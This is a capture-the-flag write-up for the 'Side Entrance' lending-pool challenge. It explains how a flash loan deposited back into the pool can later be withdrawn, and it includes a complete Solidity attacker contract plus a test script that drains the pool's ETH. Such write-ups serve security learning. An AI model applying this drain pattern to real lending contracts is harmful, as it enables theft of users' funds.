# Challenge #4 - Side Entrance

## Description

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

## What we have

We have 1 contract here:

1. `SideEntranceLenderPool`: Flashloan pool offering ETH. Additionally, users can affect pool's balance by depositing and withdrawing ETH.

Looking at the contract, we find these issues:

## Issues in SideEntranceLenderPool

### 1. Prone to reentrancy attack

The contract should use `ReentrancyGuard` to secure itself.

An optional issue description

## Solution

The contract seems pretty simple on the front. But one thing that stands out is how it is using two different counters for its ETH balance (one is `balances` mapping, and the other is `address(this).balance`). While a change in `balances` affects the contract's balance, the opposite is not necessarily true.

We use one such case for this exploit.

1. We take a huge loan from the contract.
2. We `deposit` it in the contract, as if we own it. The contract believes that this is new balance coming in.
3. Flashloan ends, the balance of the contract is same as before (since we deposited it back).
4. Now we use the `withdraw` method to pull out those funds. We're rich!

```ts
// solidity
pragma solidity ^0.8.0;

import "contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool internal sideEntrance;
    uint sideEntranceBalance;

    function attack(address _sideEntrance) external payable {
        sideEntrance = SideEntranceLenderPool(_sideEntrance);

        sideEntranceBalance = _sideEntrance.balance;
        sideEntrance.flashLoan(sideEntranceBalance);

        sideEntrance.withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function execute() external payable override {
        sideEntrance.deposit{value: sideEntranceBalance}();
    }

    receive() external payable {}
}

```

```ts
// test script
const AttackerFactory = await ethers.getContractFactory(
  "SideEntranceAttacker",
  attacker
);
const attackerContract = await AttackerFactory.deploy();
await attackerContract.attack(this.pool.address, {
  value: await ethers.provider.getBalance(this.pool.address),
});
```

## Probable Fix

How I would have fixed it.Adding a reentrancy guard to `deposit` would have mitigated this risk.
